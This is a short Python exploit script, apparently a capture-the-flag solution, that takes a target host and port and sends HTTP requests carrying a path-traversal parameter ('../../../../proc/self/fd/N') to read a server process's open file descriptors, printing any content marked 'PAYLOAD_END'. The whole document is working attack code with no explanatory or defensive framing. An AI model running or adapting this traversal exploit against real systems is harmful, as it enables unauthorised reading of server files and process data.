import requests
import sys

HOST,PORT = sys.argv[1].split(":")
PORT = int(PORT)

for i in range(10,15):
    try:
        r = requests.get(f"http://{HOST}:{PORT}/?x=../../../../proc/self/fd/{i}")
        if b"PAYLOAD_END" in r.content:
            print(i, r.content.split(b"PAYLOAD_END")[0])
    except requests.exceptions.ChunkedEncodingError:
        pass
